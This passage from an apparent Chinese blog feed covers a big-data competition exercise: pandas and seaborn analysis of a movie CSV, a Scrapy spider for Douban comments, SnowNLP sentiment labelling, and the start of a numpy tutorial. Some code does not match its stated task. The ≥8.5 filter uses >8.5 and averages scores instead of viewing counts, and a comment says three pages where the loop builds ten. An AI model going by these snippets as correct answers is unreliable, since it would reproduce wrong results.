language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'movie2.csv'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'regions'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'score'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sort_values<span class="token punctuation">(</span>ascending<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">.</span>head<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>统计中国（中国大陆、中国香港、中国台湾）电影的平均评分保留两位小数</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'movie2.csv'</span><span class="token punctuation">)</span>  df_fil <span class="token operator">=</span> df<span class="token punctuation">[</span>df<span class="token punctuation">[</span><span class="token string">'regions'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isin<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'中国大陆'</span><span class="token punctuation">,</span> <span class="token string">'中国香港'</span><span class="token punctuation">,</span><span class="token string">'中国台湾'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>df_fil<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'regions'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'score'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>统计所有评分大于等于8.5的电影的平均观看数，取整</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'movie2.csv'</span><span class="token punctuation">)</span> df_fil <span class="token operator">=</span> df<span class="token punctuation">[</span>df<span class="token punctuation">[</span><span class="token string">'score'</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token number">8.5</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>df_fil<span class="token punctuation">[</span><span class="token string">'score'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="子任务二：数据可视化-1"><a href="#子任务二：数据可视化-1" class="headerlink" title="子任务二：数据可视化"></a>子任务二：数据可视化</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> matplotlib<span class="token keyword">import</span> seaborn<span class="token comment"># 指定字体为SimHei</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>用柱状图显示各评分的电影总数</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'movie2.csv'</span><span class="token punctuation">)</span>data <span class="token operator">=</span> df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'score'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># seaborn中的data必须是dataframe数据，先转化</span>data <span class="token operator">=</span> data<span class="token punctuation">.</span>to_frame<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'count'</span><span class="token punctuation">)</span>seaborn<span class="token punctuation">.</span>barplot<span class="token punctuation">(</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>x<span class="token operator">=</span>data<span class="token punctuation">.</span>index<span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token string">'count'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>用折线图显示2000年以后的电影平均评分走势</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'movie2.csv'</span><span class="token punctuation">)</span>df<span class="token punctuation">[</span><span class="token string">'release_date'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'release_date'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>astype<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span>df <span class="token operator">=</span> df<span class="token punctuation">[</span>df<span class="token punctuation">[</span><span class="token string">'release_date'</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token number">2000</span><span class="token punctuation">]</span>seaborn<span class="token punctuation">.</span>lineplot<span class="token punctuation">(</span>data<span class="token operator">=</span>df<span class="token punctuation">,</span>x<span class="token operator">=</span><span class="token string">'release_date'</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token string">'score'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>用饼图显示各国家和地区电影数数占比</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'movie2.csv'</span><span class="token punctuation">)</span>df<span class="token punctuation">[</span><span class="token string">'regions'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'regions'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>data <span class="token operator">=</span> df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'regions'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span>data<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind<span class="token operator">=</span><span class="token string">'pie'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="任务C：数据标注-1"><a href="#任务C：数据标注-1" class="headerlink" title="任务C：数据标注"></a>任务C：数据标注</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># (爬虫)部门是公司的核心业务部门</span><span class="token comment"># 负责创建requests对象和接受引擎发送过来的response（Downloader部门爬取到的内容），从中解析并提取出有用的数据。</span><span class="token comment"># 它对应的是爬虫流程【解析数据】和【提取数据】这两步</span><span class="token keyword">import</span> scrapy<span class="token keyword">import</span> bs4<span class="token comment"># 需要引用DoubanItem，它在items里面。因为是items在top250.py的上一级目录，所以要用..items，这是一个固定用法。</span><span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>items <span class="token keyword">import</span> DoubanItem<span class="token comment"># DoubanSpider类继承自scrapy.Spider类</span><span class="token keyword">class</span> <span class="token class-name">DoubanSpider</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Spider<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> <span class="token string">'douban'</span>   <span class="token comment"># 定义爬虫的名字，这个名字是爬虫的唯一标识</span>    <span class="token comment"># allowed_domains是定义允许爬虫爬取的网址域名（不需要加https://）。</span>    <span class="token comment"># 如果网址的域名不在这个列表里，就会被过滤掉</span>    <span class="token comment"># 一定在book.douban.com这个域名之下，防止爬到广告页面去</span>    allowed_domains <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'movie.douban.com'</span><span class="token punctuation">]</span>    <span class="token comment"># 定义起始网址，就是爬虫从哪个网址开始抓取</span>    <span class="token comment"># 注：allowed_domains的设定对start_urls里的网址不会有影响</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'https://movie.douban.com/subject/1292052/comments?sort=new_score&amp;status=P'</span><span class="token punctuation">]</span>    <span class="token comment"># 根据url的规律，构建出前三页地址</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'https://movie.douban.com/subject/1292052/comments?start=</span><span class="token interpolation"><span class="token punctuation">{</span>x<span class="token operator">*</span><span class="token number">20</span><span class="token punctuation">}</span></span><span class="token string">&amp;limit=20&amp;status=P&amp;sort=new_score'</span></span>        start_urls<span class="token punctuation">.</span>append<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token comment"># 解析下载器传过来的数据</span>    <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#实例化DoubanItem类。</span>        item <span class="token operator">=</span> DoubanItem<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            soup <span class="token operator">=</span> bs4<span class="token punctuation">.</span>BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>            datas <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">'comment'</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> data <span class="token keyword">in</span> datas<span class="token punctuation">:</span>                item<span class="token punctuation">[</span><span class="token string">'date'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'span'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">'comment-time'</span><span class="token punctuation">)</span>                item<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">"comment-content"</span><span class="token punctuation">)</span>                <span class="token keyword">yield</span> item<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="子任务一：分类标注"><a href="#子任务一：分类标注" class="headerlink" title="子任务一：分类标注"></a>子任务一：分类标注</h3><p><strong>对情感倾向分数大于等于0.6的评论数据标注为正向</strong></p><p><strong>对情感倾向分数大于0.4小于0.6的数据标注为中性数据</strong></p><p><strong>对情感倾向分数小于等于0.4的评论信息标注为负向</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">from</span> snownlp <span class="token keyword">import</span> SnowNLPdf <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'movie_comment_all.csv'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">snow</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> SnowNLP<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>sentiments<span class="token operator">&gt;=</span><span class="token number">0.6</span><span class="token punctuation">:</span>        qinggan <span class="token operator">=</span> <span class="token string">'正向'</span>    <span class="token keyword">elif</span> <span class="token number">0.6</span><span class="token operator">&gt;</span>SnowNLP<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>sentiments<span class="token operator">&gt;</span><span class="token number">0.4</span><span class="token punctuation">:</span>        qinggan <span class="token operator">=</span> <span class="token string">'中性'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        qinggan <span class="token operator">=</span> <span class="token string">'负向'</span>    <span class="token keyword">return</span> qinggandf<span class="token punctuation">[</span><span class="token string">'评分'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">apply</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span>SnowNLP<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>sentiments<span class="token punctuation">)</span>df<span class="token punctuation">[</span><span class="token string">'情感倾向'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">map</span><span class="token punctuation">(</span>snow<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"评分"</span><span class="token punctuation">,</span> <span class="token string">"情感倾向"</span><span class="token punctuation">,</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sample<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 随机抽取n行</span>df<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">'standard.csv'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="任务D：业务分析和方案架构设计-1"><a href="#任务D：业务分析和方案架构设计-1" class="headerlink" title="任务D：业务分析和方案架构设计"></a>任务D：业务分析和方案架构设计</h2><h3 id="子任务一：业务分析-1"><a href="#子任务一：业务分析-1" class="headerlink" title="子任务一：业务分析"></a>子任务一：业务分析</h3><p><strong>完成movie_comment_all.csv评论情感分析功能，以月度未单位统计每月某电影的正向、负向评价数量，绘制折线图，并对电影的风评趋势作出简要分析</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> matplotlib<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> seaborn <span class="token keyword">as</span> snsdf <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'standard.csv'</span><span class="token punctuation">)</span>df<span class="token punctuation">[</span><span class="token string">'date'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'date'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">.</span>extract<span class="token punctuation">(</span><span class="token string">r'(\d{4}-\d{2})'</span><span class="token punctuation">)</span><span class="token comment"># print(df.groupby(['date','情感倾向']).size())</span><span class="token comment"># print(df.groupby('date')['情感倾向'].value_counts())</span>df_data <span class="token operator">=</span> df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'date'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'情感倾向'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value_counts<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reset_index<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'count'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sns<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>font<span class="token operator">=</span><span class="token string">'SimHei'</span><span class="token punctuation">)</span>sns<span class="token punctuation">.</span>lineplot<span class="token punctuation">(</span>data<span class="token operator">=</span>df_data<span class="token punctuation">,</span>x<span class="token operator">=</span><span class="token string">'date'</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token string">'count'</span><span class="token punctuation">,</span>hue<span class="token operator">=</span><span class="token string">'情感倾向'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span>rotation<span class="token operator">=</span><span class="token number">90</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 大数据 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大数据竞赛基础知识</title>
      <link href="/2023/08/21/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%AB%9E%E8%B5%9B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/08/21/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%AB%9E%E8%B5%9B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="numpy"><a href="#numpy" class="headerlink" title="numpy"></a>numpy</h1><h2 id="一、创建ndarray"><a href="#一、创建ndarray" class="headerlink" title="一、创建ndarray"></a>一、创建ndarray</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">print</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span>__version__<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="1-使用np-array-由python-list创建"><a href="#1-使用np-array-由python-list创建" class="headerlink" title="1. 使用np.array()由python list创建"></a>1. 使用np.array()由python list创建</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npn1 <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>n1<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-使用np的函数创建"><a href="#2-使用np的函数创建" class="headerlink" title="2. 使用np的函数创建"></a>2. 使用np的函数创建</h3><h4 id="1-np-ones-shape-dtype-x3D-None-order-x3D-’C’"><a href="#1-np-ones-shape-dtype-x3D-None-order-x3D-’C’" class="headerlink" title="1. np.ones(shape, dtype=None, order=’C’)"></a>1. np.ones(shape, dtype=None, order=’C’)</h4><ul><li>生成由1组成的数组</li><li>shape可以指定数字或元祖</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npn1 <span class="token operator">=</span> np<span class="token punctuation">.</span>ones<span class="token punctuation">(</span>shape <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>int16<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="2-np-zeros-shape-dtype-x3D-float-order-x3D-’C’"><a href="#2-np-zeros-shape-dtype-x3D-float-order-x3D-’C’" class="headerlink" title="2. np.zeros(shape, dtype=float, order=’C’)"></a>2. np.zeros(shape, dtype=float, order=’C’)</h4><ul><li>生成由0组成的数组</li><li>shape可以指定数字或元祖</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npn1 <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>shape<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>int16<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="3-np-full-shape-fill-value-dtype-x3D-None-order-x3D-’C’"><a href="#3-np-full-shape-fill-value-dtype-x3D-None-order-x3D-’C’" class="headerlink" title="3. np.full(shape, fill_value, dtype=None, order=’C’)"></a>3. np.full(shape, fill_value, dtype=None, order=’C’)</h4><ul><li>生成自定义填充内容的数组</li><li>shape可以指定数字或元祖</li><li>fill_value指定填充内容,格式为数字</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npn1 <span class="token operator">=</span> np<span class="token punctuation">.</span>full<span class="token punctuation">(</span>shape <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>fill_value<span class="token operator">=</span><span class="token number">9</span><span class="token punctuation">,</span>dtype<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="4-np-eye-N-M-x3D-None-k-x3D-0-dtype-x3D-float"><a href="#4-np-eye-N-M-x3D-None-k-x3D-0-dtype-x3D-float" class="headerlink" title="4. np.eye(N, M=None, k=0, dtype=float)"></a>4. np.eye(N, M=None, k=0, dtype=float)</h4><ul><li>对角线为1其他的位置为0</li><li>N,M指定行数列数</li><li>k代表偏移值,为正右偏移,为负左偏移</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npn1 <span class="token operator">=</span> np<span class="token punctuation">.</span>eye<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="5-np-linspace-start-stop-num-x3D-50-endpoint-x3D-True-retstep-x3D-False-dtype-x3D-None"><a href="#5-np-linspace-start-stop-num-x3D-50-endpoint-x3D-True-retstep-x3D-False-dtype-x3D-None" class="headerlink" title="5.  np.linspace(start, stop, num=50, endpoint=True, retstep=False, dtype=None)"></a>5.  np.linspace(start, stop, num=50, endpoint=True, retstep=False, dtype=None)</h4><ul><li>对一个数值区间进行等分</li><li>start,stop起始值</li><li>num等分的份数</li><li>endpoint是否使用末尾值</li><li>retstep是否显示步长</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npn1 <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="6-np-arange-start-stop-step-dtype-x3D-None"><a href="#6-np-arange-start-stop-step-dtype-x3D-None" class="headerlink" title="6. np.arange([start, ]stop, [step, ]dtype=None)"></a>6. np.arange([start, ]stop, [step, ]dtype=None)</h4><ul><li>生成一个等差数列</li><li>start,stop起始值</li><li>step步长默认为1</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npn1 <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="7-np-random-randint-low-high-x3D-None-size-x3D-None-dtype-x3D-’l’"><a href="#7-np-random-randint-low-high-x3D-None-size-x3D-None-dtype-x3D-’l’" class="headerlink" title="7.  np.random.randint(low, high=None, size=None, dtype=’l’)"></a>7.  np.random.randint(low, high=None, size=None, dtype=’l’)</h4><ul><li>在一个指定的数值区间内生成随机整数的数组</li><li>low,high最大值最小值</li><li>size数组样式,可以为数字或数组</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npn1 <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span>size <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="8-np-random-random-size-x3D-None"><a href="#8-np-random-random-size-x3D-None" class="headerlink" title="8.np.random.random(size=None)"></a>8.np.random.random(size=None)</h4><ul><li>生成0到1的随机数</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npn1 <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span>size <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="9-np-random-randn-d0-d1-…-dn"><a href="#9-np-random-randn-d0-d1-…-dn" class="headerlink" title="9. np.random.randn(d0, d1, …, dn)"></a>9. np.random.randn(d0, d1, …, dn)</h4><ul><li>生成标准正态分布的样本集</li><li>标准正太分布　np.random.normal()</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npn1 <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="二、ndarray属性"><a href="#二、ndarray属性" class="headerlink" title="二、ndarray属性"></a>二、ndarray属性</h2><ul><li>ndim  :  维度（数组每次新增的轴，也就是最外围的维度，都为 0，也就是axis = 0都是新增的维度）</li><li>shape :  形状</li><li>size  :  数组元素的个数</li><li>dtype : 元素类型<br>1）<code>int</code>（整数）：包括 8-64 位的长度；<br>2）<code>float</code>（浮点数）：包括 16-64 位的长度；<br>3）<code>unit</code>（无符号整数）：包括 8-64 位的长度；<br>4）<code>bool</code>（布尔类型）。</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npn1 <span class="token 